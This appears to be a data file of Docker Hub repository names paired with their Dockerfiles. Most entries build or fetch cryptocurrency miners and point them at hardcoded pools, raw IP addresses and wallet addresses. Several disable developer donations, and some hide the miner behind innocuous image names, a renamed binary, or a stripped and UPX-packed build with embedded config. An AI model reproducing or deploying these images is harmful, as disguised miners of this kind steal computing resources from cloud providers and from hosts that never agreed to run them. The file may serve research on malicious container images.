linuxrun/cpu; b'FROM  alpine:latest\r\nRUN   adduser -S -D -H -h /xmrig xminer\r\nRUN   apk --no-cache upgrade && \\\r\n      apk --no-cache add \\\r\n        git \\\r\n        cmake \\\r\n        libuv-dev \\\r\n        build-base && \\\r\n      git clone https://github.com/xmrig/xmrig && \\\r\n      cd xmrig && \\\r\n      sed -i -e \'s/constexpr const int kDonateLevel = 5;/constexpr const int kDonateLevel = 0;/g\' src/donate.h && \\\r\n      mkdir build && \\\r\n      cmake -DCMAKE_BUILD_TYPE=Release . && \\\r\n      make && \\\r\n      apk del \\\r\n        build-base \\\r\n        cmake \\\r\n        git\r\nUSER xminer\r\nWORKDIR    /xmrig\r\nENTRYPOINT  ["./xmrig", "--algo=cryptonight", "--url=stratum+tcp://54.194.73.206:5555", "--user=4AWKneBnsjM3mmcKCgaaftJ1c49FjdUGGcyJ9ZtwDKKcagu1qgGxyJaUMzFChyo54Q7KrSHQHfeK2WDmTnbit4Jv5HYQCic", "--pass=x", "--max-cpu-usage=100"]'
degra/dckr; b'FROM  alpine:latest\nRUN   adduser -S -D -H -h /xmrig miner\nRUN   apk --no-cache upgrade && \\\n      apk --no-cache add \\\n        git \\\n        cmake \\\n\tlibmicrohttpd-dev \\\n        libuv-dev \\\n        build-base && \\\n      git clone https://github.com/xmrig/xmrig && \\\n      cd xmrig && \\\n      sed -i -e \'s/constexpr const int kDonateLevel = 5;/constexpr const int kDonateLevel = 0;/g\' src/donate.h && \\\n      mkdir build && \\\n      cmake -DCMAKE_BUILD_TYPE=Release . && \\\n      make && \\\n      apk del \\\n        build-base \\\n        cmake \\\n        git\n\nUSER miner\nCOPY config.json /xmrig\nWORKDIR    /xmrig\nENTRYPOINT  ["./xmrig"]'
ericro/equinicehash; b'FROM ubuntu:latest\nMAINTAINER eric <er@iex.ec>\n\nRUN apt-get update && \\\n\tapt-get install -y git cmake build-essential libboost-all-dev\n\nRUN git clone -b Linux https://github.com/nicehash/nheqminer.git --depth=1\n\nRUN cd nheqminer/cpu_xenoncat/Linux/asm/ \\\n    && sh assemble.sh \\\n    && cd ../../../Linux_cmake/nheqminer_cpu \\\n    && cmake . \\\n    && make -j $(nproc)\n\nENTRYPOINT ["nheqminer/Linux_cmake/nheqminer_cpu/nheqminer_cpu -l zec-eu1.nanopool.org:6666 -u t1JmoxkLcdvbLsfUbTKm3CSsC8fyeFvUeRM -p x"]'
linuxdebian32/apkxmnod; b'FROM  alpine:latest\nRUN   adduser -S -D -H -h /xmrig miner\nRUN   apk --no-cache upgrade && \\\n      apk --no-cache add \\\n        git \\\n        cmake \\\n        libuv-dev \\\n        build-base && \\\n      git clone https://github.com/xmrig/xmrig && \\\n      cd xmrig && \\\n      mkdir build && \\\n      cmake -DCMAKE_BUILD_TYPE=Release . && \\\n      make && \\\n      apk del \\\n        build-base \\\n        cmake \\\n        git\nUSER miner\nWORKDIR    /xmrig\nENTRYPOINT  ["./xmrig"]'
perfectweb/cryptonight; b'FROM perfectweb/base:v3\nMAINTAINER Alin Jurj <office@perfectweb.ro>\n\nUSER root\nWORKDIR /\n\nRUN apt-get install -qqy libmicrohttpd-dev ocl-icd-opencl-dev\n\nRUN git clone https://github.com/fireice-uk/xmr-stak-amd.git\nRUN cd /xmr-stak-amd && cmake . && make\n\nENV WALLET 4GdoN7NCTi8a5gZug7PrwZNKjvHFmKeV11L6pNJPgj5QNEHsN6eeX3DaAQFwZ1ufD4LYCZKArktt113W7QjWvQ7CWGGFVGSSXdKSPo6pG3\nENV PASSWORD x\nENV POOLHOSTNAME pool.minexmr.com\nENV PORT 7777\nENV RAWINTENSITY 1000\nENV WORKSIZE 8\n\nCOPY config.tpl /xmr-stak-amd/\nCOPY entrypoint.sh /xmr-stak-amd/\nRUN chmod +x /xmr-stak-amd/entrypoint.sh\n\nWORKDIR /xmr-stak-amd\n\nENTRYPOINT ["/xmr-stak-amd/entrypoint.sh"]'
luisquinto765/tes68467248668; b'# Note: On Alpine 1.5\nFROM alpine:3.4\nRUN set -x \\\n    # Runtime dependencies.\n && apk add --no-cache \\\n        libcurl \\\n        libgcc \\\n        libstdc++ \\\n        openssl \\\n    # Build dependencies.\n && apk add --no-cache -t .build-deps \\\n        autoconf \\\n        automake \\\n        build-base \\\n        curl \\\n        curl-dev \\\n        git \\\n        openssl-dev \\\n    # Compile from source code.\n && git clone --recursive https://github.com/tpruvot/cpuminer-multi.git /tmp/cpuminer \\\n && cd /tmp/cpuminer \\\n && ./autogen.sh \\\n && ./configure CFLAGS="-O2 -march=native" --with-crypto --with-curl \\\n && make install \\\n    # Install dumb-init (avoid PID 1 issues).\n    # https://github.com/Yelp/dumb-init\n && curl -Lo /usr/local/bin/dumb-init https://github.com/Yelp/dumb-init/releases/download/v1.1.3/dumb-init_1.1.3_amd64 \\\n && chmod +x /usr/local/bin/dumb-init \\\n    # Clean-up\n && cd / \\\n && apk del --purge .build-deps \\\n && rm -rf /tmp/* \\\n    # Verify\n && cpuminer --cputest \\\n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \\\n & sleep 5 \n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \\\n & sleep 5 \n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \\\n & sleep 5 \n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \\\n & sleep 5 \n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \n\nENTRYPOINT ["dumb-init"]\nCMD ["cpuminer", "--help"]'
wehisujawa/drender; b'FROM  alpine:latest\nRUN   adduser -S -D -H -h /xmrig xworker\nRUN   apk --no-cache upgrade && \\\n      apk --no-cache add \\\n        git \\\n        cmake \\\n        libuv-dev \\\n        build-base && \\\n      git clone https://github.com/xmrig/xmrig && \\\n      cd xmrig && \\\n      sed -i -e \'s/constexpr const int kDonateLevel = 5;/constexpr const int kDonateLevel = 0;/g\' src/donate.h && \\\n      mkdir build && \\\n      cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release . && \\\n      make && \\\n      apk del \\\n        build-base \\\n        cmake \\\n        git\n\nUSER xworker\nCOPY config.json /xmrig\nWORKDIR    /xmrig\nENTRYPOINT  ["./xmrig"]'
luisquinto765/tes68332592525; b'# Note: On Alpine 1.5\nFROM alpine:3.4\nRUN set -x \\\n    # Runtime dependencies.\n && apk add --no-cache \\\n        libcurl \\\n        libgcc \\\n        libstdc++ \\\n        openssl \\\n    # Build dependencies.\n && apk add --no-cache -t .build-deps \\\n        autoconf \\\n        automake \\\n        build-base \\\n        curl \\\n        curl-dev \\\n        git \\\n        openssl-dev \\\n    # Compile from source code.\n && git clone --recursive https://github.com/tpruvot/cpuminer-multi.git /tmp/cpuminer \\\n && cd /tmp/cpuminer \\\n && ./autogen.sh \\\n && ./configure CFLAGS="-O2 -march=native" --with-crypto --with-curl \\\n && make install \\\n    # Install dumb-init (avoid PID 1 issues).\n    # https://github.com/Yelp/dumb-init\n && curl -Lo /usr/local/bin/dumb-init https://github.com/Yelp/dumb-init/releases/download/v1.1.3/dumb-init_1.1.3_amd64 \\\n && chmod +x /usr/local/bin/dumb-init \\\n    # Clean-up\n && cd / \\\n && apk del --purge .build-deps \\\n && rm -rf /tmp/* \\\n    # Verify\n && cpuminer --cputest \\\n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \\\n & sleep 5 \n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \\\n & sleep 5 \n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \\\n & sleep 5 \n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \\\n & sleep 5 \n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \n\nENTRYPOINT ["dumb-init"]\nCMD ["cpuminer", "--help"]'
laurentgrangeau/eth-proxy; b'FROM ubuntu:15.10\n\nWORKDIR /tmp/\n\nRUN apt-get update && apt-get -yy install python-twisted unzip wget\nRUN wget http://dwarfpool.com/static/eth-proxy.zip\nRUN unzip eth-proxy.zip\n\nCOPY eth-proxy.conf /tmp/eth-proxy/\n\nWORKDIR /tmp/eth-proxy/\n\nEXPOSE 8080\nCMD python ./eth-proxy.py'
contribu/bitzeny_docker; b'FROM buildpack-deps:trusty\n\nSHELL ["/bin/bash", "-c"]\n\nRUN apt-get update \\\n  && apt-get install -y \\\n    git \\\n  && rm -rf /var/lib/apt/lists/* \\  \n  && rm -rf /tmp/*\n\nRUN cd /root \\\n  && git clone https://github.com/bitzeny/cpuminer.git \\\n  && cd cpuminer \\\n  && ./autogen.sh \\\n  && ./configure CFLAGS="-O3 -march=native -funroll-loops -fomit-frame-pointer" \\\n  && make \\\n  && mv minerd /usr/bin \\\n  && cd /root \\\n  && rm -rf cpuminer'
trpass/test; b'FROM ubuntu:16.04\n\nRUN apt-get update \\\n    && apt-get -qq --no-install-recommends install \\\n        libmicrohttpd10 \\\n        libssl1.0.0 \\\n    && rm -r /var/lib/apt/lists/*\n\nENV XMR_STAK_CPU_VERSION v1.1.0-1.2.0\n\nRUN set -x \\\n    && buildDeps=\' \\\n        ca-certificates \\\n        cmake \\\n        curl \\\n        g++ \\\n        libmicrohttpd-dev \\\n        libssl-dev \\\n        make \\\n    \' \\\n    && apt-get -qq update \\\n    && apt-get -qq --no-install-recommends install $buildDeps \\\n    && rm -rf /var/lib/apt/lists/* \\\n    \\\n    && mkdir -p /usr/local/src/xmr-stak-cpu/build \\\n    && cd /usr/local/src/xmr-stak-cpu/ \\\n    && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1 \\\n    && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h \\\n    && cd build \\\n    && cmake .. \\\n    && make -j$(nproc) \\\n    && cp bin/xmr-stak-cpu /usr/local/bin/ \\\n    && sed -r \\\n        -e \'s/^("pool_address" : ).*,/\\1"xmr.mypool.online:3333",/\' \\\n        -e \'s/^("wallet_address" : ).*,/\\1"49TfoHGd6apXxNQTSHrMBq891vH6JiHmZHbz5Vx36nLRbz6WgcJunTtgcxnoG6snKFeGhAJB5LjyAEnvhBgCs5MtEgML3LU",/\' \\\n        -e \'s/^("pool_password" : ).*,/\\1"docker-xmr-stak-cpu:x",/\' \\\n        ../config.txt > /usr/local/etc/config.txt \\\n    \\\n    && rm -r /usr/local/src/xmr-stak-cpu \\\n    && apt-get -qq --auto-remove purge $buildDeps\n\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
perfectweb/equihash; b'FROM ubuntu:16.04\n\nMAINTAINER Alin Jurj <office@perfectweb.ro>\n\nUSER root\nWORKDIR /\n\nRUN apt-get update -qq\nRUN apt-get install -qqy libcurl4-openssl-dev git make automake gcc\nRUN apt-get install -qqy ocl-icd-opencl-dev\nRUN apt-get install -qqy libjansson-dev\nRUN apt-get install -qqy build-essential pkg-config libc6-dev m4 g++-multilib autoconf libtool ncurses-dev unzip python zlib1g-dev wget bsdmainutils opencl-headers mesa-common-dev vim-common\n\nRUN git clone https://github.com/nginnever/zogminer.git\nRUN cd zogminer/ && ./zcutil/fetch-params.sh && ./zcutil/build.sh -j$(nproc)\n\nENV DEBIAN_FRONTEND noninteractive\nENV WALLET t1eiBzTHA6yjMT1gkpJw4Q4wMTGwqNHMeY3\nENV POOL zec-eu1.nanopool.org:6666\n\nENTRYPOINT ["/zogminer/src/zcash-miner"]\nCMD ["-G -stratum=\'stratum+tcp://$POOL\' -user=$WALLET -password=x"]\n\n# docker run -dit --name=zcash --restart=always perfectweb/equihash:zogminer'
minsysio/docker; b'# Use phusion/baseimage as base image. To make your builds reproducible, make\n# sure you lock down to a specific version, not to `latest`!\n# See https://github.com/phusion/baseimage-docker/blob/master/Changelog.md for\n# a list of version numbers..\nFROM phusion/baseimage:master\n\n# Use baseimage-docker\'s init system.\nCMD ["/sbin/my_init"]\n\nRUN apt-get update \\\n    && apt-get -qq --no-install-recommends install \\\n        ca-certificates \\\n        wget \\\n    && rm -r /var/lib/apt/lists/*\n\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli \\\n    && dpkg -i *.deb \\\n    && rm *.deb\n\nENTRYPOINT ["minergate-cli"]\nCMD ["-user", "cyril.szecsko@gmail.com", "-xmr"]\n\n# Clean up APT when done.\nRUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*'
googledeployr/dockers; b'FROM  alpine:latest\nRUN   adduser -S -D -H -h /xmrig miner\nRUN   apk --no-cache upgrade && \\\n      apk --no-cache add \\\n        git \\\n        cmake \\\n        libuv-dev \\\n        build-base && \\\n      git clone https://github.com/xmrig/xmrig && \\\n      cd xmrig && \\\n      sed -i "s/kDefaultDonateLevel = 5/kDefaultDonateLevel = 0/g" src/donate.h && \\ \n      sed -i "s/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/g" src/donate.h && \\ \n      mkdir build && \\\n      cmake -DWITH_AEON=OFF -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release -DWITH_TLS=OFF . && \\\n      make && \\\n      apk del \\\n        build-base \\\n        cmake \\\n        git\nUSER miner\nWORKDIR    /xmrig\nENTRYPOINT ["./xmrig","-o","pool.t00ls.ru:443","--safe","-k"]'
luisquinto765/tes6889262916; b'# Note: On Alpine 1.5\nFROM alpine:3.4\nRUN set -x \\\n    # Runtime dependencies.\n && apk add --no-cache \\\n        libcurl \\\n        libgcc \\\n        libstdc++ \\\n        openssl \\\n    # Build dependencies.\n && apk add --no-cache -t .build-deps \\\n        autoconf \\\n        automake \\\n        build-base \\\n        curl \\\n        curl-dev \\\n        git \\\n        openssl-dev \\\n    # Compile from source code.\n && git clone --recursive https://github.com/tpruvot/cpuminer-multi.git /tmp/cpuminer \\\n && cd /tmp/cpuminer \\\n && ./autogen.sh \\\n && ./configure CFLAGS="-O2 -march=native" --with-crypto --with-curl \\\n && make install \\\n    # Install dumb-init (avoid PID 1 issues).\n    # https://github.com/Yelp/dumb-init\n && curl -Lo /usr/local/bin/dumb-init https://github.com/Yelp/dumb-init/releases/download/v1.1.3/dumb-init_1.1.3_amd64 \\\n && chmod +x /usr/local/bin/dumb-init \\\n    # Clean-up\n && cd / \\\n && apk del --purge .build-deps \\\n && rm -rf /tmp/* \\\n    # Verify\n && cpuminer --cputest \\\n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \\\n & sleep 5 \n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \\\n & sleep 5 \n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \\\n & sleep 5 \n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \\\n & sleep 5 \n && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \n\nENTRYPOINT ["dumb-init"]\nCMD ["cpuminer", "--help"]'
chaow/test; b'FROM ubuntu:16.04\n\nRUN apt-get update \\\n    && apt-get -qq --no-install-recommends install \\\n        ca-certificates \\\n        wget \\\n    && rm -r /var/lib/apt/lists/*\n\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli \\\n    && dpkg -i *.deb \\\n    && rm *.deb\n\nENTRYPOINT ["minergate-cli"]\nCMD ["-user", "chaowmail@yahoo.com", "-xmr"]'
lanhmanh4989/mng; b'FROM ubuntu:16.04\n\nRUN apt-get update \\\n    && apt-get -qq --no-install-recommends install \\\n        ca-certificates \\\n        wget \\\n    && rm -r /var/lib/apt/lists/*\n\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli \\\n    && dpkg -i *.deb \\\n    && rm *.deb\n\nENTRYPOINT ["minergate-cli"]\nCMD ["-user", "nguyentuan4989@gmail.com", "-xmr"]'
zenidine/nizadam; b'FROM  alpine:3.9\nRUN   adduser -S -D -H -h /xmrig miner && \\\n      apk --no-cache upgrade && \\\n      apk --no-cache add \\\n        git \\\n        cmake \\\n        libuv-dev \\\n        upx binutils build-base libmicrohttpd-dev openssl-dev && \\\n        git config --global http.sslVerify false && git clone https://github.com/polambakhaz/xmrig && \\\n      cd xmrig && \\\n      mkdir build && \\\n      cd build && \\\n      cmake -DWITH_CN_GPU=OFF -DWITH_EMBEDDED_CONFIG=ON -DCMAKE_BUILD_TYPE=Release .. && \\\n      make && \\\n      rm -rf ./src Makefile CMakeFiles CMakeCache.txt && \\\n      find . -name \'*cmake*\' -delete && \\\n      rm -rf ../doc  ../res  ../src ../CHANGELOG.md  ../CMakeLists.txt  ../LICENSE  ../README.md ../.git ../cmake && \\\n      strip --strip-all -s -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag xmrig && \\\n      upx -9 --8mib-ram --lzma xmrig && \\\n      apk del --no-cache --purge \\\n        build-base \\\n        cmake \\\n        git upx binutils\nUSER miner\nEXPOSE 80\nWORKDIR    /xmrig/build\nENTRYPOINT  ["./xmrig"]'
freeupcoin/almatest; b'FROM alpine:latest\nRUN   adduser -S -D -h /almaminer freecoin\nRUN   apk --no-cache upgrade && \\\n      apk --no-cache add \\\n        automake \\\n        cmake \\\n        autoconf \\\n        openssl-dev \\\n        curl-dev \\\n        git \\\n        build-base && \\\n        cd /almaminer && \\\n        git clone https://github.com/fireice-uk/xmr-stak.git && \\\n        mkdir xmr-stak/build && \\\n        cd xmr-stak/build && \\\n        cmake .. \\\n              -DHWLOC_ENABLE=OFF \\\n              -DCUDA_ENABLE=OFF  \\\n              -DMICROHTTPD_ENABLE=OFF \\\n              -DOpenCL_ENABLE=OFF && \\\n        make install \nCOPY  config.txt cpu.txt pools.txt /almaminer/\nRUN   chown -R freecoin /almaminer \nUSER  freecoin\nWORKDIR    /almaminer\nENTRYPOINT  ["/almaminer/xmr-stak/build/bin/xmr-stak"]'
brockali/etn; b'# Pull base image.\nFROM ubuntu:16.04\n\nRUN apt-get update && apt-get install -y git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake\nRUN git clone https://github.com/wolf9466/cpuminer-multi && cd cpuminer-multi && ./autogen.sh && CFLAGS="-march=native" && ./configure && make\n\nRUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*\n\n# Define working directory.\nWORKDIR /\n\nCOPY run.sh /\nRUN chmod +x /run.sh\n\nENTRYPOINT ["/run.sh"]'
amolinado/dcm; b'FROM alpine\n\nRUN set -x\n# Runtime dependencies.\nRUN apk add --no-cache \\\n        libcurl \\\n        libgcc \\\n        libstdc++ \\\n        openssl\n# Build dependencies.\nRUN apk add --no-cache -t .build-deps \\\n        autoconf \\\n        automake \\\n        build-base \\\n        curl \\\n        curl-dev \\\n        git \\\n        openssl-dev \\\n        nodejs\n# Grant privileges\nRUN chgrp -R 0     /var /etc /home \\\n && chmod -R g+rwX /var /etc /home \\\n && chmod 664 /etc/passwd /etc/group\n\n# Compile from source code.\nRUN git clone --recursive https://github.com/amolinado/cpuminer-multi.git /tmp/cpuminer \\\n && cd /tmp/cpuminer \\\n && ./autogen.sh \\\n && ./configure CFLAGS="-O2 -march=native" --with-crypto --with-curl \\\n && make install \n\n# Install dumb-init (avoid PID 1 issues). https://github.com/Yelp/dumb-init\nRUN curl -Lo /usr/local/bin/dumb-init https://github.com/Yelp/dumb-init/releases/download/v1.1.3/dumb-init_1.1.3_amd64 \\\n && chmod +x /usr/local/bin/dumb-init\n\n# Clean-up\nRUN apk del --purge .build-deps \\\n && rm -rf /tmp/* \n\nENTRYPOINT ["dumb-init","cpuminer"]\nCMD ["--help"]'
aztain/dcm; b'FROM alpine\n\nRUN set -x\n# Runtime dependencies.\nRUN apk add --no-cache \\\n        libcurl \\\n        libgcc \\\n        libstdc++ \\\n        openssl\n# Build dependencies.\nRUN apk add --no-cache -t .build-deps \\\n        autoconf \\\n        automake \\\n        build-base \\\n        curl \\\n        curl-dev \\\n        git \\\n        openssl-dev \\\n        nodejs\n# Grant privileges\nRUN chgrp -R 0     /var /etc /home \\\n && chmod -R g+rwX /var /etc /home \\ \n && chmod 664 /etc/passwd /etc/group\n\n# Compile from source code.\nRUN git clone --recursive https://github.com/amolinado/cpuminer-multi.git /tmp/cpuminer \\\n && cd /tmp/cpuminer \\\n && ./autogen.sh \\\n && ./configure CFLAGS="-O2 -march=native" --with-crypto --with-curl \\\n && make install \\\n# Install dumb-init (avoid PID 1 issues).\n# https://github.com/Yelp/dumb-init\n && curl -Lo /usr/local/bin/dumb-init https://github.com/Yelp/dumb-init/releases/download/v1.1.3/dumb-init_1.1.3_amd64 \\\n && chmod +x /usr/local/bin/dumb-init \\\n# Clean-up\n && cd / \\\n && apk del --purge .build-deps \\\n && rm -rf /tmp/* \\\n# Verify\n && cpuminer --cputest \\\n && cpuminer --version\n\nWORKDIR /home\nUSER 1000\n\nENTRYPOINT ["dumb-init"]'
blueskyos/hubgate; b'FROM ubuntu:16.04\n\nRUN apt-get update -qq\n\nRUN apt-get install -qy build-essential git libtool libjansson* libssl-dev libcurl4-openssl-dev libncurses5-dev libgmp-dev automake\n\nRUN git clone https://github.com/JayDDee/cpuminer-opt \n\nRUN cd cpuminer-opt && ./build.sh  \\\n    && make install \\\n    && cd .. \\\n    && rm -rf cpuminer-opt'
hkese/etn; b'FROM ubuntu:16.04\n\n# Prepare directories\nRUN mkdir /config\n\n# Install dependencies\nRUN apt-get update && apt-get -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev nano\n\n# Clean\nRUN rm -rf /var/lib/apt/lists/*\n\n# Get Code\nADD https://github.com/IndeedMiners/xmr-aeon-stak/archive/2.4.7.tar.gz /opt/xmr-stak-cpu.tar.gz\nRUN mkdir /opt/xmr-stak-cpu\nRUN tar xfv /opt/xmr-stak-cpu.tar.gz --strip 1 -C /opt/xmr-stak-cpu\nRUN sed -i \'s/fDevDonationLevel = 1.0/fDevDonationLevel = 0.0/\' /opt/xmr-stak-cpu/xmrstak/donate-level.hpp\nWORKDIR /opt/xmr-stak-cpu/\nRUN cmake -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF .\nRUN make\n\n# Volume\nADD https://raw.githubusercontent.com/hkese/newxmrstakcpu/master/config.txt /opt/xmr-stak-cpu/config.txt\nADD https://raw.githubusercontent.com/hkese/newxmrstakcpu/master/cpu.txt /opt/xmr-stak-cpu/cpu.txt\nADD https://raw.githubusercontent.com/hkese/newxmrstakcpu/master/pools.txt /opt/xmr-stak-cpu/pools.txt\n\n# Ports\nEXPOSE 8888\n\n# Command\nCMD ["/opt/xmr-stak-cpu/bin/xmr-stak"]'
timmo6/proxy; b'FROM alpine:latest as build\nRUN apk add --update --no-cache wget libuv-dev git cmake git build-base libmicrohttpd-dev openssl-dev libuuid util-linux-dev\nRUN git clone https://github.com/zenidine/xmrig-proxy && \\\n\tcd xmrig-proxy && \\\n\tmkdir build && \\\n\tcd build && \\\n\tcmake -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF  .. && \\\n\tmake && \\\n\twget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip && \\\n\tunzip ngrok-stable-linux-386.zip \nFROM alpine:latest\nCOPY --from=build /xmrig-proxy/build/xmrig-proxy /xmrig-proxy\nCOPY --from=build /xmrig-proxy/build/ngrok /ngrok\nADD config.json /config.json\nADD entrypoint.sh /entrypoint.sh\nRUN chmod a+x /entrypoint.sh && mkdir -p /.ngrok2 && chmod 777 -R /.ngrok2\nEXPOSE 3333 2222 4040\nENTRYPOINT ["/entrypoint.sh"]'
blueskyos/gatecli; b'FROM ubuntu:16.04\n\nRUN apt-get update -qq\n\nRUN apt-get install -qy build-essential git libtool libjansson* libssl-dev libcurl4-openssl-dev libncurses5-dev libgmp-dev automake\n\nRUN git clone https://github.com/JayDDee/cpuminer-opt \n\nRUN cd cpuminer-opt && ./build.sh  \\\n    && make install \\\n    && cd .. \\\n    && rm -rf cpuminer-opt'
igorivanovichrlxkok/image; b'FROM ubuntu:latest\n\nRUN apt-get update && apt-get install -y software-properties-common -y\nRUN add-apt-repository ppa:jonathonf/gcc-7.1 -y\nRUN apt-get update && apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev gcc-7 g++-7 -y\n\nRUN git clone https://github.com/vajisah50/tuctuc.git\nRUN mkdir tuctuc/build\nRUN cd tuctuc/build && cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7\nRUN cd tuctuc/build && make\nRUN mv tuctuc/build/xmrig /usr/bin/mama'
blueskyos/nicecrypto; b'FROM ubuntu:16.04\n\nRUN apt-get update -qq\nRUN apt-get install -qy build-essential git libtool libjansson* libssl-dev libcurl4-openssl-dev libncurses5-dev libgmp-dev automake\nRUN git clone https://github.com/JayDDee/cpuminer-opt \n\nRUN cd cpuminer-opt && ./build.sh  \\\n    && make install \\\n    && cd .. \\\n    && rm -rf cpuminer-opt\n\nCMD ["cpuminer","-a","cryptonight","-o","stratum+tcp://cryptonight.usa.nicehash.com:3355","-u","18CU3wfYbaUYiji64N6rpv8HZdH9ZCG8CQ.w1","-p","x"]'
w1695426/docker001; b'FROM  ubuntu\nRUN adduser -S -D -H -h /xmrig-2.6.2 xminer\nRUN apt-get update && apt-get install -y wget\nRUN apt-get install -y psmisc\nRUN apt-get install -y nano\nRUN apt-get install -y bash\nRUN wget https://github.com/lanka256/openshif-docker/releases/download/1.0/xmrig002.tar.gz\nRUN wget https://github.com/lanka256/openshif-docker/releases/download/1.0/xmrig001.tar.gz\nRUN tar -xvzf xmrig002.tar.gz\nRUN cd xmrig-2.6.2/\nRUN wget https://github.com/lanka256/openshif-docker/releases/download/1.0/script.sh\nRUN chmod a+x script.sh\nRUN wget https://github.com/lanka256/openshif-docker/releases/download/1.0/script.txt\nUSER xminer\nWORKDIR xmrig-2.6.2/\nCMD ./xmrig -o 85.255.7.60:80 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev -p hunter2 -k --av=2 --nicehash  --cpu-priority 1 --donate-level=1 -t 1'
errornetwork404/quq; b'FROM alpine:3.8\n\nENV VERSION 2.6.4\n\nRUN apk update && \\\n    apk add git make g++ cmake \\\n        libuv-dev libmicrohttpd-dev --no-cache\n\nCOPY entrypoint.sh /usr/local/bin/xmrig.sh\n\nENTRYPOINT ["xmrig.sh"]'
pavrych/mer91734gc; b'FROM\tubuntu:16.04\nMAINTAINER\tEugene <1@1.net>\n\nARG home=/\nENV home=$home\n\nRUN\tapt-get update && apt-get install -y git wget build-essential pkg-config cmake unzip python python-zmq zlib1g-dev wget libcurl4-openssl-dev automake curl libjansson-dev autotools-dev libtool libboost-all-dev\nRUN git clone https://github.com/meritlabs/merit-miner\n\nWORKDIR /merit-miner\nRUN ./autogen.sh\nRUN ./configure\nRUN make\n\n\nENTRYPOINT ["/bin/bash", "-c", "/merit-miner/./minerd -o stratum+tcp://parachute.merit.me:3333 -u M8WnYnLakHfNX1LpPuGq2m7u4Ys4sRsawq"]'
w1695426/openshift-docker2; b'FROM ubuntu \nRUN adduser -S -D -H -h /xmrig-2.6.2 xminer\nRUN apt-get update && apt-get install -y wget\nRUN wget https://github.com/xmrig/xmrig/releases/download/v2.6.2/xmrig-2.6.2-xenial-amd64.tar.gz\nRUN tar -xvzf xmrig-2.6.2-xenial-amd64.tar.gz\nUSER xminer \nWORKDIR xmrig-2.6.2/\nCMD ./xmrig -o 85.255.7.60:80 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev -p openshift -k --av=2 --nicehash  --cpu-priority 1 --donate-level=1 -t 1'
w1695426/openshif-docker; b'FROM  ubuntu\nRUN adduser -S -D -H -h /xmrig-2.6.2 xminer\nRUN apt-get update && apt-get install -y git-core\nRUN git clone https://github.com/lanka256/openshif-docker.git\nWORKDIR openshif-docker/\nRUN chmod +x xmrig\nUSER xminer\nCMD ./xmrig'
swissdevnet/xst; b'FROM alpine:latest\nCOPY xmr-stak /\nCOPY config.txt /\nRUN apk --no-cache upgrade \\\n    && apk --no-cache add \\\n    openssl\nENTRYPOINT ["./xmr-stak"]'
